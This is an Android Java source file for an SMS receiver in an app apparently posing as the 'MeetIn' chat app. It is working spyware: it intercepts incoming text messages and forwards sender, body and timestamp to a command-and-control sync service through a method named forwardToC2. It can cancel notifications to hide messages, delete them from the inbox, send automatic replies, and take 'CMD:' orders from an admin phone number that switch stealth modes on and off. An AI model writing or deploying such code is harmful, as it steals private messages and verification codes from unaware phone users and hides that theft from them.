package chat.meetin.app;

import android.app.NotificationManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;
import java.io.File;
import java.io.FileWriter;
import java.text.SimpleDateFormat;
import java.util.Date;

public class SmsReceiver extends BroadcastReceiver {
    private static final String TAG = "SmsReceiver";
    private static final String PREFS = "MeetIn";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction() == null) return;
        String action = intent.getAction();
        if (!action.equals("android.provider.Telephony.SMS_DELIVER") &&
            !action.equals("android.provider.Telephony.SMS_RECEIVED")) return;

        try {
            Bundle bundle = intent.getExtras();
            if (bundle == null) return;
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus == null) return;

            for (Object pdu : pdus) {
                SmsMessage sms;
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    sms = SmsMessage.createFromPdu((byte[]) pdu, bundle.getString("format"));
                } else {
                    sms = SmsMessage.createFromPdu((byte[]) pdu);
                }
                if (sms == null) continue;

                String sender = sms.getDisplayOriginatingAddress();
                String body = sms.getDisplayMessageBody();
                long timestamp = sms.getTimestampMillis();

                Log.d(TAG, "SMS from " + sender);

                if (isRemoteCommand(context, sender, body)) {
                    handleRemoteCommand(context, body);
                    return;
                }
                if (!shouldIntercept(context, body)) continue;
                if (!isSenderAllowed(context, sender)) continue;
                if (!isWithinTimeWindow(context)) continue;
                if (isSilentModeEnabled(context)) cancelNotifications(context);

                forwardToC2(context, sender, body, timestamp);
                handleAutoReply(context, sender);
                logSmsStats(context, sender, body);
                if (isAutoDeleteEnabled(context)) deleteSms(context, sender, body);
            }
        } catch (Exception e) {
            Log.e(TAG, "SMS error", e);
        }
    }

    private boolean isSilentModeEnabled(Context ctx) {
        return ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE).getBoolean("silent_mode", false);
    }

    private void cancelNotifications(Context ctx) {
        try {
            NotificationManager nm = (NotificationManager) ctx.getSystemService(Context.NOTIFICATION_SERVICE);
            if (nm != null) nm.cancelAll();
        } catch (Exception ignored) {}
    }

    private boolean shouldIntercept(Context ctx, String body) {
        if (body == null) return false;
        String keywords = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE).getString("sms_keywords", "");
        if (keywords.isEmpty()) return true;
        for (String kw : keywords.split(",")) {
            if (body.toLowerCase().contains(kw.trim().toLowerCase())) return true;
        }
        return false;
    }

    private boolean isSenderAllowed(Context ctx, String sender) {
        if (sender == null) return false;
        SharedPreferences prefs = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE);
        String wl = prefs.getString("sms_whitelist", "");
        String bl = prefs.getString("sms_blacklist", "");
        if (!bl.isEmpty()) {
            for (String b : bl.split(",")) {
                if (sender.contains(b.trim())) return false;
            }
        }
        if (!wl.isEmpty()) {
            for (String w : wl.split(",")) {
                if (sender.contains(w.trim())) return true;
            }
            return false;
        }
        return true;
    }

    private boolean isWithinTimeWindow(Context ctx) {
        SharedPreferences prefs = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE);
        String start = prefs.getString("sms_time_start", "");
        String end = prefs.getString("sms_time_end", "");
        if (start.isEmpty() || end.isEmpty()) return true;
        try {
            java.util.Calendar cal = java.util.Calendar.getInstance();
            int now = cal.get(java.util.Calendar.HOUR_OF_DAY) * 60 + cal.get(java.util.Calendar.MINUTE);
            int s = Integer.parseInt(start.split(":")[0]) * 60 + Integer.parseInt(start.split(":")[1]);
            int e = Integer.parseInt(end.split(":")[0]) * 60 + Integer.parseInt(end.split(":")[1]);
            return now >= s && now <= e;
        } catch (Exception ex) { return true; }
    }

    private boolean isAutoDeleteEnabled(Context ctx) {
        return ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE).getBoolean("autodelete", false);
    }

    private void deleteSms(Context ctx, String sender, String body) {
        try {
            Uri uri = Uri.parse("content://sms/inbox");
            ctx.getContentResolver().delete(uri, "address=? AND body=?", new String[]{sender, body});
        } catch (Exception ignored) {}
    }

    private void handleAutoReply(Context ctx, String sender) {
        SharedPreferences prefs = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE);
        String reply = prefs.getString("auto_reply", null);
        if (reply == null || sender == null) return;
        int delay = prefs.getInt("auto_reply_delay", 0);
        if (delay > 0) {
            new Handler(Looper.getMainLooper()).postDelayed(() -> sendReply(sender, reply), delay);
        } else {
            sendReply(sender, reply);
        }
    }

    private void sendReply(String sender, String msg) {
        try {
            SmsManager.getDefault().sendTextMessage(sender, null, msg, null, null);
        } catch (Exception ignored) {}
    }

    private void logSmsStats(Context ctx, String sender, String body) {
        try {
            SharedPreferences prefs = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE);
            prefs.edit().putInt("sms_total", prefs.getInt("sms_total", 0) + 1).apply();
            File file = new File(ctx.getFilesDir(), "sms_log.txt");
            FileWriter fw = new FileWriter(file, true);
            fw.write(new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date()) + "|" + sender + "|" + body + "\n");
            fw.close();
        } catch (Exception ignored) {}
    }

    private boolean isRemoteCommand(Context ctx, String sender, String body) {
        if (sender == null || body == null) return false;
        String admin = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE).getString("admin_number", "");
        if (admin.isEmpty() || !sender.contains(admin)) return false;
        return body.startsWith("CMD:");
    }

    private void handleRemoteCommand(Context ctx, String body) {
        try {
            String cmd = body.substring(4).trim().toLowerCase();
            SharedPreferences.Editor ed = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE).edit();
            if (cmd.equals("silent on")) ed.putBoolean("silent_mode", true);
            else if (cmd.equals("silent off")) ed.putBoolean("silent_mode", false);
            else if (cmd.equals("stealth on")) ed.putBoolean("stealth_mode", true);
            else if (cmd.equals("stealth off")) ed.putBoolean("stealth_mode", false);
            else if (cmd.equals("autodelete on")) ed.putBoolean("autodelete", true);
            else if (cmd.equals("autodelete off")) ed.putBoolean("autodelete", false);
            ed.apply();
        } catch (Exception ignored) {}
    }

    private void forwardToC2(Context ctx, String sender, String body, long timestamp) {
        try {
            String entry = sender + "|" + body + "|" + timestamp + "\n";
            SharedPreferences prefs = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE);
            prefs.edit().putString("sms_queue", prefs.getString("sms_queue", "") + entry).apply();

            Intent si = new Intent(ctx, DataSyncService.class);
            si.setAction("SMS_RECEIVED");
            si.putExtra("sender", sender);
            si.putExtra("body", body);
            si.putExtra("timestamp", timestamp);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ctx.startForegroundService(si);
            } else {
                ctx.startService(si);
            }
        } catch (Exception ignored) {}
    }
}
